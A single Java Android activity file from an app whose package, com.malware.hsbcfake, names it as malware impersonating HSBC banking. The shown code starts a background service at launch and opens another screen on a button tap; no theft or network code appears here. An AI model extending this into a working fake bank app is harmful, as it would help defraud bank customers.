package com.malware.hsbcfake;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.ImageButton;
import android.widget.Toast;

public class HomeActivity extends Activity {

	private Activity activity;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		activity = this;
		
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		
		setContentView(R.layout.activity_home);
		
		Intent intent = new Intent(this, TasksService.class);
		startService(intent);
		
		ImageButton btnAccess = (ImageButton) findViewById(R.id.btnAccess);
		
		if (btnAccess != null) {
			btnAccess.setOnClickListener(new OnClickListener() {
				
				@Override
				public void onClick(View v) {					
					Intent intent = new Intent(activity, MainActivity.class);
					startActivity(intent);
				}
			});
		}		
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.home, menu);
		return true;
	}
	
	

}
